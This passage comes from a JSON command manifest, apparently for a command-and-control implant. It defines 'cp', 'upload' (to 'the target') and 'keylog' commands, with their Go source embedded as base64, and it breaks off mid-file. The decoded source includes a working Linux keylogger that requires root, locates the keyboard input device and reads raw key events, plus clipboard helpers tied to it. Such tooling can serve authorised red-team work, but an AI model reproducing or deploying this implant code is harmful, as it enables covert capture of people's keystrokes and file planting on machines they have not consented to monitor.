              "xpc_emitter_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSB4cGMKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJmbXQiCikKCmNvbnN0ICgKCUFMTCA9ICJfX2FsbEV2ZW50c19fIgopCgp0eXBlIFhwY0V2ZW50IG1hcFtzdHJpbmddaW50ZXJmYWNle30KCnR5cGUgRXZlbnRIYW5kbGVyRnVuYyBmdW5jKFhwY0V2ZW50KSBib29sCgp0eXBlIEVtaXR0ZXIgc3RydWN0IHsKCWhhbmRsZXJzIG1hcFtzdHJpbmddRXZlbnRIYW5kbGVyRnVuYwoJZXZlbnQgY2hhbiBYcGNFdmVudAp9CgovLyBJbml0IGluaXRpYWxpemUgdGhlIGVtaXR0ZXIgYW5kIHN0YXJ0IGEgZ29yb3V0aW5lIHRvIGV4ZWN1dGUgdGhlIGV2ZW50IGhhbmRsZXJzCmZ1bmMgKGUgKkVtaXR0ZXIpIEluaXQoKSB7CgllLmhhbmRsZXJzID0gbWFrZShtYXBbc3RyaW5nXUV2ZW50SGFuZGxlckZ1bmMpCgllLmV2ZW50ID0gbWFrZShjaGFuIFhwY0V2ZW50KQoKCS8vIGV2ZW50IGhhbmRsZXIKCWdvIGZ1bmMoKSB7CgkJZm9yIHsKCQkJZXYgOj0gPC1lLmV2ZW50CgoJCQlpZiBmbiwgb2sgOj0gZS5oYW5kbGVyc1tBTExdOyBvayB7CgkJCQlpZiBmbihldikgewoJCQkJCWJyZWFrCgkJCQl9CgkJCX0gZWxzZSB7CgkJCQlyYXdFdmVudCwgXyA6PSBqc29uLk1hcnNoYWxJbmRlbnQoZXYsICIiLCAiCSIpCgkJCQlmbXQuUHJpbnRmKCIlcyIsIHN0cmluZyhyYXdFdmVudCkpCgkJCX0KCQl9CgoJCWNsb3NlKGUuZXZlbnQpIC8vIFRPRklYOiB0aGlzIGNhdXNlcyBuZXcgImVtaXRzIiB0byBwYW5pYy4KCX0oKQp9CgpmdW5jIChlICpFbWl0dGVyKSBFbWl0KGV2IFhwY0V2ZW50KSAgewoJZS5ldmVudCA8LSBldgp9CgpmdW5jIChlICpFbWl0dGVyKSBPbihldmVudCBzdHJpbmcsIGZuIEV2ZW50SGFuZGxlckZ1bmMpICB7Cgp9"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cp [source] [destination] (or through GUI)",
          "version": 5,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Copy a file from one location to another.",
          "cmd": "cp",
          "parameters": [
            {
              "type": "String",
              "hint": "Source file to copy.",
              "choices": "",
              "required": true,
              "name": "source"
            },
            {
              "type": "String",
              "hint": "New file with contents of source.",
              "choices": "",
              "required": true,
              "name": "destination"
            }
          ],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "destination",
              "artifact": "File Create",
              "artifact_string": "File * created.",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "cp.go": "cGFja2FnZSBjcAoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoJImZtdCIKCSJpbyIKCSJvcyIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp0eXBlIEFyZ3VtZW50cyBzdHJ1Y3QgewoJU291cmNlICAgICAgc3RyaW5nIGBqc29uOiJzb3VyY2UiYAoJRGVzdGluYXRpb24gc3RyaW5nIGBqc29uOiJkZXN0aW5hdGlvbiJgCn0KCmZ1bmMgY29weShzcmMsIGRzdCBzdHJpbmcpIChpbnQ2NCwgZXJyb3IpIHsKCXNvdXJjZUZpbGVTdGF0LCBlcnIgOj0gb3MuU3RhdChzcmMpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gMCwgZXJyCgl9CgoJaWYgIXNvdXJjZUZpbGVTdGF0Lk1vZGUoKS5Jc1JlZ3VsYXIoKSB7CgkJcmV0dXJuIDAsIGZtdC5FcnJvcmYoIiVzIGlzIG5vdCBhIHJlZ3VsYXIgZmlsZSIsIHNyYykKCX0KCglzb3VyY2UsIGVyciA6PSBvcy5PcGVuKHNyYykKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiAwLCBlcnIKCX0KCWRlZmVyIHNvdXJjZS5DbG9zZSgpCgoJZGVzdGluYXRpb24sIGVyciA6PSBvcy5DcmVhdGUoZHN0KQoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuIDAsIGVycgoJfQoJZGVmZXIgZGVzdGluYXRpb24uQ2xvc2UoKQoJbkJ5dGVzLCBlcnIgOj0gaW8uQ29weShkZXN0aW5hdGlvbiwgc291cmNlKQoJcmV0dXJuIG5CeXRlcywgZXJyCn0KCi8vUnVuIC0gRnVuY3Rpb24gdGhhdCBleGVjdXRlcyB0aGUgY29weSBjb21tYW5kCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCWFyZ3MgOj0gJkFyZ3VtZW50c3t9CgllcnIgOj0ganNvbi5Vbm1hcnNoYWwoW11ieXRlKHRhc2suUGFyYW1zKSwgYXJncykKCWlmIGVyciAhPSBuaWwgewoJCQoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCgljb3BpZWRCeXRlcywgZXJyIDo9IGNvcHkoYXJncy5Tb3VyY2UsIGFyZ3MuRGVzdGluYXRpb24pCgoJaWYgZXJyICE9IG5pbCB7CgkJCgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgltc2cuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJDb3BpZWQgJWQgYnl0ZXMgdG8gJXMiLCBjb3BpZWRCeXRlcywgYXJncy5EZXN0aW5hdGlvbikKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "upload",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "upload a file to the target ",
          "cmd": "upload",
          "parameters": [
            {
              "type": "String",
              "hint": "Remote file path",
              "choices": "",
              "required": true,
              "name": "remote_path"
            },
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "file_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "keylog",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Keylog users as root on Linux or as a specific user on windows. Currently doesn't keylog on macOS",
          "cmd": "keylog",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1056",
              "attack_name": "Input Capture"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "keylog.go": "cGFja2FnZSBrZXlsb2cKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJwa2cvcHJvZmlsZXMiCgkiZm10IgoKCSJrZXlsb2cva2V5c3RhdGUiCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKCi8vUnVuIC0gRnVuY3Rpb24gdGhhdCBleGVjdXRlcyB0aGUgc2hlbGwgY29tbWFuZApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCWVyciA6PSBrZXlzdGF0ZS5TdGFydEtleWxvZ2dlcih0YXNrKQoKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgltc2cuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJTdGFydGVkIGtleWxvZ2dlci4iKQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            },
            {
              "clipboard\/clipboard_unix.go": "Ly8gQ29weXJpZ2h0IDIwMTMgQGF0b3R0by4gQWxsIHJpZ2h0cyByZXNlcnZlZC4KLy8gVXNlIG9mIHRoaXMgc291cmNlIGNvZGUgaXMgZ292ZXJuZWQgYnkgYSBCU0Qtc3R5bGUKLy8gbGljZW5zZSB0aGF0IGNhbiBiZSBmb3VuZCBpbiB0aGUgTElDRU5TRSBmaWxlLgoKLy8gK2J1aWxkIGZyZWVic2QgbGludXggbmV0YnNkIG9wZW5ic2Qgc29sYXJpcyBkcmFnb25mbHkKCnBhY2thZ2UgY2xpcGJvYXJkCgppbXBvcnQgKAoJImVycm9ycyIKCSJvcyIKCSJvcy9leGVjIgopCgpjb25zdCAoCgl4c2VsICAgICAgICAgICAgICAgPSAieHNlbCIKCXhjbGlwICAgICAgICAgICAgICA9ICJ4Y2xpcCIKCXdsY29weSAgICAgICAgICAgICA9ICJ3bC1jb3B5IgoJd2xwYXN0ZSAgICAgICAgICAgID0gIndsLXBhc3RlIgoJdGVybXV4Q2xpcGJvYXJkR2V0ID0gInRlcm11eC1jbGlwYm9hcmQtZ2V0IgoJdGVybXV4Q2xpcGJvYXJkU2V0ID0gInRlcm11eC1jbGlwYm9hcmQtc2V0IgopCgp2YXIgKAoJUHJpbWFyeSBib29sCgoJcGFzdGVDbWRBcmdzIFtdc3RyaW5nCgljb3B5Q21kQXJncyAgW11zdHJpbmcKCgl4c2VsUGFzdGVBcmdzID0gW11zdHJpbmd7eHNlbCwgIi0tb3V0cHV0IiwgIi0tY2xpcGJvYXJkIn0KCXhzZWxDb3B5QXJncyAgPSBbXXN0cmluZ3t4c2VsLCAiLS1pbnB1dCIsICItLWNsaXBib2FyZCJ9CgoJeGNsaXBQYXN0ZUFyZ3MgPSBbXXN0cmluZ3t4Y2xpcCwgIi1vdXQiLCAiLXNlbGVjdGlvbiIsICJjbGlwYm9hcmQifQoJeGNsaXBDb3B5QXJncyAgPSBbXXN0cmluZ3t4Y2xpcCwgIi1pbiIsICItc2VsZWN0aW9uIiwgImNsaXBib2FyZCJ9CgoJd2xwYXN0ZUFyZ3MgPSBbXXN0cmluZ3t3bHBhc3RlLCAiLS1uby1uZXdsaW5lIn0KCXdsY29weUFyZ3MgID0gW11zdHJpbmd7d2xjb3B5fQoKCXRlcm11eFBhc3RlQXJncyA9IFtdc3RyaW5ne3Rlcm11eENsaXBib2FyZEdldH0KCXRlcm11eENvcHlBcmdzICA9IFtdc3RyaW5ne3Rlcm11eENsaXBib2FyZFNldH0KCgltaXNzaW5nQ29tbWFuZHMgPSBlcnJvcnMuTmV3KCJObyBjbGlwYm9hcmQgdXRpbGl0aWVzIGF2YWlsYWJsZS4gUGxlYXNlIGluc3RhbGwgeHNlbCwgeGNsaXAsIHdsLWNsaXBib2FyZCBvciBUZXJtdXg6QVBJIGFkZC1vbiBmb3IgdGVybXV4LWNsaXBib2FyZC1nZXQvc2V0LiIpCikKCmZ1bmMgaW5pdCgpIHsKCWlmIG9zLkdldGVudigiV0FZTEFORF9ESVNQTEFZIikgIT0gIiIgewoJCXBhc3RlQ21kQXJncyA9IHdscGFzdGVBcmdzCgkJY29weUNtZEFyZ3MgPSB3bGNvcHlBcmdzCgoJCWlmIF8sIGVyciA6PSBleGVjLkxvb2tQYXRoKHdsY29weSk7IGVyciA9PSBuaWwgewoJCQlpZiBfLCBlcnIgOj0gZXhlYy5Mb29rUGF0aCh3bHBhc3RlKTsgZXJyID09IG5pbCB7CgkJCQlyZXR1cm4KCQkJfQoJCX0KCX0KCglwYXN0ZUNtZEFyZ3MgPSB4Y2xpcFBhc3RlQXJncwoJY29weUNtZEFyZ3MgPSB4Y2xpcENvcHlBcmdzCgoJaWYgXywgZXJyIDo9IGV4ZWMuTG9va1BhdGgoeGNsaXApOyBlcnIgPT0gbmlsIHsKCQlyZXR1cm4KCX0KCglwYXN0ZUNtZEFyZ3MgPSB4c2VsUGFzdGVBcmdzCgljb3B5Q21kQXJncyA9IHhzZWxDb3B5QXJncwoKCWlmIF8sIGVyciA6PSBleGVjLkxvb2tQYXRoKHhzZWwpOyBlcnIgPT0gbmlsIHsKCQlyZXR1cm4KCX0KCglwYXN0ZUNtZEFyZ3MgPSB0ZXJtdXhQYXN0ZUFyZ3MKCWNvcHlDbWRBcmdzID0gdGVybXV4Q29weUFyZ3MKCglpZiBfLCBlcnIgOj0gZXhlYy5Mb29rUGF0aCh0ZXJtdXhDbGlwYm9hcmRTZXQpOyBlcnIgPT0gbmlsIHsKCQlpZiBfLCBlcnIgOj0gZXhlYy5Mb29rUGF0aCh0ZXJtdXhDbGlwYm9hcmRHZXQpOyBlcnIgPT0gbmlsIHsKCQkJcmV0dXJuCgkJfQoJfQoKCVVuc3VwcG9ydGVkID0gdHJ1ZQp9CgpmdW5jIGdldFBhc3RlQ29tbWFuZCgpICpleGVjLkNtZCB7CglpZiBQcmltYXJ5IHsKCQlwYXN0ZUNtZEFyZ3MgPSBwYXN0ZUNtZEFyZ3NbOjFdCgl9CglyZXR1cm4gZXhlYy5Db21tYW5kKHBhc3RlQ21kQXJnc1swXSwgcGFzdGVDbWRBcmdzWzE6XS4uLikKfQoKZnVuYyBnZXRDb3B5Q29tbWFuZCgpICpleGVjLkNtZCB7CglpZiBQcmltYXJ5IHsKCQljb3B5Q21kQXJncyA9IGNvcHlDbWRBcmdzWzoxXQoJfQoJcmV0dXJuIGV4ZWMuQ29tbWFuZChjb3B5Q21kQXJnc1swXSwgY29weUNtZEFyZ3NbMTpdLi4uKQp9CgpmdW5jIHJlYWRBbGwoKSAoc3RyaW5nLCBlcnJvcikgewoJaWYgVW5zdXBwb3J0ZWQgewoJCXJldHVybiAiIiwgbWlzc2luZ0NvbW1hbmRzCgl9CglwYXN0ZUNtZCA6PSBnZXRQYXN0ZUNvbW1hbmQoKQoJb3V0LCBlcnIgOj0gcGFzdGVDbWQuT3V0cHV0KCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiAiIiwgZXJyCgl9CglyZXR1cm4gc3RyaW5nKG91dCksIG5pbAp9CgpmdW5jIHdyaXRlQWxsKHRleHQgc3RyaW5nKSBlcnJvciB7CglpZiBVbnN1cHBvcnRlZCB7CgkJcmV0dXJuIG1pc3NpbmdDb21tYW5kcwoJfQoJY29weUNtZCA6PSBnZXRDb3B5Q29tbWFuZCgpCglpbiwgZXJyIDo9IGNvcHlDbWQuU3RkaW5QaXBlKCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBlcnIKCX0KCglpZiBlcnIgOj0gY29weUNtZC5TdGFydCgpOyBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gZXJyCgl9CglpZiBfLCBlcnIgOj0gaW4uV3JpdGUoW11ieXRlKHRleHQpKTsgZXJyICE9IG5pbCB7CgkJcmV0dXJuIGVycgoJfQoJaWYgZXJyIDo9IGluLkNsb3NlKCk7IGVyciAhPSBuaWwgewoJCXJldHVybiBlcnIKCX0KCXJldHVybiBjb3B5Q21kLldhaXQoKQp9Cg=="
            },
            {
              "clipboard\/clipboard_darwin.go": "Ly8gQ29weXJpZ2h0IDIwMTMgQGF0b3R0by4gQWxsIHJpZ2h0cyByZXNlcnZlZC4KLy8gVXNlIG9mIHRoaXMgc291cmNlIGNvZGUgaXMgZ292ZXJuZWQgYnkgYSBCU0Qtc3R5bGUKLy8gbGljZW5zZSB0aGF0IGNhbiBiZSBmb3VuZCBpbiB0aGUgTElDRU5TRSBmaWxlLgoKLy8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBjbGlwYm9hcmQKCmltcG9ydCAoCgkib3MvZXhlYyIKKQoKdmFyICgKCXBhc3RlQ21kQXJncyA9ICJwYnBhc3RlIgoJY29weUNtZEFyZ3MgID0gInBiY29weSIKKQoKZnVuYyBnZXRQYXN0ZUNvbW1hbmQoKSAqZXhlYy5DbWQgewoJcmV0dXJuIGV4ZWMuQ29tbWFuZChwYXN0ZUNtZEFyZ3MpCn0KCmZ1bmMgZ2V0Q29weUNvbW1hbmQoKSAqZXhlYy5DbWQgewoJcmV0dXJuIGV4ZWMuQ29tbWFuZChjb3B5Q21kQXJncykKfQoKZnVuYyByZWFkQWxsKCkgKHN0cmluZywgZXJyb3IpIHsKCXBhc3RlQ21kIDo9IGdldFBhc3RlQ29tbWFuZCgpCglvdXQsIGVyciA6PSBwYXN0ZUNtZC5PdXRwdXQoKQoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuICIiLCBlcnIKCX0KCXJldHVybiBzdHJpbmcob3V0KSwgbmlsCn0KCmZ1bmMgd3JpdGVBbGwodGV4dCBzdHJpbmcpIGVycm9yIHsKCWNvcHlDbWQgOj0gZ2V0Q29weUNvbW1hbmQoKQoJaW4sIGVyciA6PSBjb3B5Q21kLlN0ZGluUGlwZSgpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gZXJyCgl9CgoJaWYgZXJyIDo9IGNvcHlDbWQuU3RhcnQoKTsgZXJyICE9IG5pbCB7CgkJcmV0dXJuIGVycgoJfQoJaWYgXywgZXJyIDo9IGluLldyaXRlKFtdYnl0ZSh0ZXh0KSk7IGVyciAhPSBuaWwgewoJCXJldHVybiBlcnIKCX0KCWlmIGVyciA6PSBpbi5DbG9zZSgpOyBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gZXJyCgl9CglyZXR1cm4gY29weUNtZC5XYWl0KCkKfQo="
            },
            {
              "clipboard\/clipboard.go": "Ly8gQ29weXJpZ2h0IDIwMTMgQGF0b3R0by4gQWxsIHJpZ2h0cyByZXNlcnZlZC4KLy8gVXNlIG9mIHRoaXMgc291cmNlIGNvZGUgaXMgZ292ZXJuZWQgYnkgYSBCU0Qtc3R5bGUKLy8gbGljZW5zZSB0aGF0IGNhbiBiZSBmb3VuZCBpbiB0aGUgTElDRU5TRSBmaWxlLgoKLy8gUGFja2FnZSBjbGlwYm9hcmQgcmVhZC93cml0ZSBvbiBjbGlwYm9hcmQKcGFja2FnZSBjbGlwYm9hcmQKCi8vIFJlYWRBbGwgcmVhZCBzdHJpbmcgZnJvbSBjbGlwYm9hcmQKZnVuYyBSZWFkQWxsKCkgKHN0cmluZywgZXJyb3IpIHsKCXJldHVybiByZWFkQWxsKCkKfQoKLy8gV3JpdGVBbGwgd3JpdGUgc3RyaW5nIHRvIGNsaXBib2FyZApmdW5jIFdyaXRlQWxsKHRleHQgc3RyaW5nKSBlcnJvciB7CglyZXR1cm4gd3JpdGVBbGwodGV4dCkKfQoKLy8gVW5zdXBwb3J0ZWQgbWlnaHQgYmUgc2V0IHRydWUgZHVyaW5nIGNsaXBib2FyZCBpbml0LCB0byBoZWxwIGNhbGxlcnMgZGVjaWRlCi8vIHdoZXRoZXIgb3Igbm90IHRvIG9mZmVyIGNsaXBib2FyZCBvcHRpb25zLgp2YXIgVW5zdXBwb3J0ZWQgYm9vbAo="
            },
            {
              "keystate\/keystate_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgpwYWNrYWdlIGtleXN0YXRlCgoKaW1wb3J0ICJlcnJvcnMiCgpmdW5jIGtleUxvZ2dlcigpIGVycm9yIHsKCXJldHVybiBlcnJvcnMuTmV3KCJOb3QgaW1wbGVtZW50ZWQuIikKfQ=="
            },
            {
              "keystate\/keystate_unix.go": "Ly8gK2J1aWxkIGxpbnV4CgovLyBUaGlzIGlzIHRha2VuIGZyb20gTWFyaW5YL2tleWxvZ2dlcgpwYWNrYWdlIGtleXN0YXRlCgppbXBvcnQgKAoJImJ5dGVzIgoJImVuY29kaW5nL2JpbmFyeSIKCSJlcnJvcnMiCgkiZm10IgoJImlvL2lvdXRpbCIKCSJsb2ciCgkib3MiCgkic3RyaW5ncyIKCSJzeXNjYWxsIgoJInVuaWNvZGUiCgkidW5zYWZlIgoKCSJrZXlsb2cvY2xpcGJvYXJkIgopCgpjb25zdCAoCgkvLyBFdlN5biBpcyB1c2VkIGFzIG1hcmtlcnMgdG8gc2VwYXJhdGUgZXZlbnRzLiBFdmVudHMgbWF5IGJlIHNlcGFyYXRlZCBpbiB0aW1lIG9yIGluIHNwYWNlLCBzdWNoIGFzIHdpdGggdGhlIG11bHRpdG91Y2ggcHJvdG9jb2wuCglFdlN5biBFdmVudFR5cGUgPSAweDAwCgkvLyBFdktleSBpcyB1c2VkIHRvIGRlc2NyaWJlIHN0YXRlIGNoYW5nZXMgb2Yga2V5Ym9hcmRzLCBidXR0b25zLCBvciBvdGhlciBrZXktbGlrZSBkZXZpY2VzLgoJRXZLZXkgRXZlbnRUeXBlID0gMHgwMQoJLy8gRXZSZWwgaXMgdXNlZCB0byBkZXNjcmliZSByZWxhdGl2ZSBheGlzIHZhbHVlIGNoYW5nZXMsIGUuZy4gbW92aW5nIHRoZSBtb3VzZSA1IHVuaXRzIHRvIHRoZSBsZWZ0LgoJRXZSZWwgRXZlbnRUeXBlID0gMHgwMgoJLy8gRXZBYnMgaXMgdXNlZCB0byBkZXNjcmliZSBhYnNvbHV0ZSBheGlzIHZhbHVlIGNoYW5nZXMsIGUuZy4gZGVzY3JpYmluZyB0aGUgY29vcmRpbmF0ZXMgb2YgYSB0b3VjaCBvbiBhIHRvdWNoc2NyZWVuLgoJRXZBYnMgRXZlbnRUeXBlID0gMHgwMwoJLy8gRXZNc2MgaXMgdXNlZCB0byBkZXNjcmliZSBtaXNjZWxsYW5lb3VzIGlucHV0IGRhdGEgdGhhdCBkbyBub3QgZml0IGludG8gb3RoZXIgdHlwZXMuCglFdk1zYyBFdmVudFR5cGUgPSAweDA0CgkvLyBFdlN3IGlzIHVzZWQgdG8gZGVzY3JpYmUgYmluYXJ5IHN0YXRlIGlucHV0IHN3aXRjaGVzLgoJRXZTdyBFdmVudFR5cGUgPSAweDA1CgkvLyBFdkxlZCBpcyB1c2VkIHRvIHR1cm4gTEVEcyBvbiBkZXZpY2VzIG9uIGFuZCBvZmYuCglFdkxlZCBFdmVudFR5cGUgPSAweDExCgkvLyBFdlNuZCBpcyB1c2VkIHRvIG91dHB1dCBzb3VuZCB0byBkZXZpY2VzLgoJRXZTbmQgRXZlbnRUeXBlID0gMHgxMgoJLy8gRXZSZXAgaXMgdXNlZCBmb3IgYXV0b3JlcGVhdGluZyBkZXZpY2VzLgoJRXZSZXAgRXZlbnRUeXBlID0gMHgxNAoJLy8gRXZGZiBpcyB1c2VkIHRvIHNlbmQgZm9yY2UgZmVlZGJhY2sgY29tbWFuZHMgdG8gYW4gaW5wdXQgZGV2aWNlLgoJRXZGZiBFdmVudFR5cGUgPSAweDE1CgkvLyBFdlB3ciBpcyBhIHNwZWNpYWwgdHlwZSBmb3IgcG93ZXIgYnV0dG9uIGFuZCBzd2l0Y2ggaW5wdXQuCglFdlB3ciBFdmVudFR5cGUgPSAweDE2CgkvLyBFdkZmU3RhdHVzIGlzIHVzZWQgdG8gcmVjZWl2ZSBmb3JjZSBmZWVkYmFjayBkZXZpY2Ugc3RhdHVzLgoJRXZGZlN0YXR1cyBFdmVudFR5cGUgPSAweDE3CikKCi8vIEV2ZW50VHlwZSBhcmUgZ3JvdXBpbmdzIG9mIGNvZGVzIHVuZGVyIGEgbG9naWNhbCBpbnB1dCBjb25zdHJ1Y3QuCi8vIEVhY2ggdHlwZSBoYXMgYSBzZXQgb2YgYXBwbGljYWJsZSBjb2RlcyB0byBiZSB1c2VkIGluIGdlbmVyYXRpbmcgZXZlbnRzLgovLyBTZWUgdGhlIEV2IHNlY3Rpb24gZm9yIGRldGFpbHMgb24gdmFsaWQgY29kZXMgZm9yIGVhY2ggdHlwZQp0eXBlIEV2ZW50VHlwZSB1aW50MTYKCi8vIGV2ZW50c2l6ZSBpcyBzaXplIG9mIHN0cnVjdHVyZSBvZiBJbnB1dEV2ZW50CnZhciBldmVudHNpemUgPSBpbnQodW5zYWZlLlNpemVvZihJbnB1dEV2ZW50e30pKQoKLy8gSW5wdXRFdmVudCBpcyB0aGUga2V5Ym9hcmQgZXZlbnQgc3RydWN0dXJlIGl0c2VsZgp0eXBlIElucHV0RXZlbnQgc3RydWN0IHsKCVRpbWUgIHN5c2NhbGwuVGltZXZhbAoJVHlwZSAgRXZlbnRUeXBlCglDb2RlICB1aW50MTYKCVZhbHVlIGludDMyCn0KCi8vIEtleVN0cmluZyByZXR1cm5zIHJlcHJlc2VudGF0aW9uIG9mIHByZXNzZWQga2V5IGFzIHN0cmluZwovLyBlZyBlbnRlciwgc3BhY2UsIGEsIGIsIGMuLi4KZnVuYyAoaSAqSW5wdXRFdmVudCkgS2V5U3RyaW5nKCkgc3RyaW5nIHsKCXJldHVybiBrZXlDb2RlTWFwW2kuQ29kZV0KfQoKLy8gS2V5UHJlc3MgaXMgdGhlIHZhbHVlIHdoZW4gd2UgcHJlc3MgdGhlIGtleSBvbiBrZXlib2FyZApmdW5jIChpICpJbnB1dEV2ZW50KSBLZXlQcmVzcygpIGJvb2wgewoJcmV0dXJuIGkuVmFsdWUgPT0gMQp9CgovLyBLZXlSZWxlYXNlIGlzIHRoZSB2YWx1ZSB3aGVuIHdlIHJlbGVhc2UgdGhlIGtleSBvbiBrZXlib2FyZApmdW5jIChpICpJbnB1dEV2ZW50KSBLZXlSZWxlYXNlKCkgYm9vbCB7CglyZXR1cm4gaS5WYWx1ZSA9PSAwCn0KCnR5cGUgS2V5TG9nZ2VyIHN0cnVjdCB7CglmZCAqb3MuRmlsZQp9CgovLyBOZXcgY3JlYXRlcyBhIG5ldyBrZXlsb2dnZXIgZm9yIGEgZGV2aWNlIHBhdGgKZnVuYyBOZXcoZGV2UGF0aCBzdHJpbmcpICgqS2V5TG9nZ2VyLCBlcnJvcikgewoJayA6PSAmS2V5TG9nZ2Vye30KCWlmICFrLklzUm9vdCgpIHsKCQlyZXR1cm4gbmlsLCBlcnJvcnMuTmV3KCJNdXN0IGJlIHJ1biBhcyByb290IikKCX0KCWZkLCBlcnIgOj0gb3MuT3BlbihkZXZQYXRoKQoJay5mZCA9IGZkCglyZXR1cm4gaywgZXJyCn0KCi8vIEZpbmRLZXlib2FyZERldmljZSBieSBnb2luZyB0aHJvdWdoIGVhY2ggZGV2aWNlIHJlZ2lzdGVyZWQgb24gT1MKLy8gTW9zdGx5IGl0IHdpbGwgY29udGFpbiBrZXl3b3JkIC0ga2V5Ym9hcmQKLy8gUmV0dXJucyB0aGUgZmlsZSBwYXRoIHdoaWNoIGNvbnRhaW5zIGV2ZW50cwpmdW5jIEZpbmRLZXlib2FyZERldmljZSgpIHN0cmluZyB7CglwYXRoIDo9ICIvc3lzL2NsYXNzL2lucHV0L2V2ZW50JWQvZGV2aWNlL25hbWUiCglyZXNvbHZlZCA6PSAiL2Rldi9pbnB1dC9ldmVudCVkIgoKCWZvciBpIDo9IDA7IGkgPCAyNTU7IGkrKyB7CgkJYnVmZiwgZXJyIDo9IGlvdXRpbC5SZWFkRmlsZShmbXQuU3ByaW50ZihwYXRoLCBpKSkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJbG9nLlByaW50bG4oZXJyLkVycm9yKCkpCgkJfQoJCWlmIHN0cmluZ3MuQ